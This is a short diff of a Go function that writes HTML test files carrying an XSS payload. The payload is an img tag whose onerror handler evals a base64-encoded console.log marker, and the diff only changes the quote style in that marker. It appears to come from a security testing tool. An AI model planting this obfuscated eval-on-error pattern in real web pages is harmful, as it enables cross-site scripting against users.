@@ -12,7 +12,7 @@ func injectIntoFileContent(payload XSSPayload) {
 
 	// Payload específico - Console log con base64
 	// Base64 de: console.log('11223344')
-	specificPayload := `"><img src=x id=Y29uc29sZS5sb2coJzExMjIzMzQ0Jyk= onerror=eval(atob(this.id))>`
+	specificPayload := `"><img src=x id=Y29uc29sZS5sb2coIjExMjIzMzQ0Iik= onerror=eval(atob(this.id))>`
 
 	// 1. Crear archivo HTML completo
 	htmlFile := filepath.Join(tempDir, fmt.Sprintf("malware_report_%s.html", payload.ID[:8]))
@@ -40,7 +40,7 @@ func injectIntoFileContent(payload XSSPayload) {
         %s
 
         <!-- Clean Tag -->
-        <img src=x id=Y29uc29sZS5sb2coJzExMjIzMzQ0Jyk= onerror=eval(atob(this.id))>
+        <img src=x id=Y29uc29sZS5sb2coIjExMjIzMzQ0Iik= onerror=eval(atob(this.id))>
     </div>
 </body>
 </html>`, payload.ID, specificPayload)
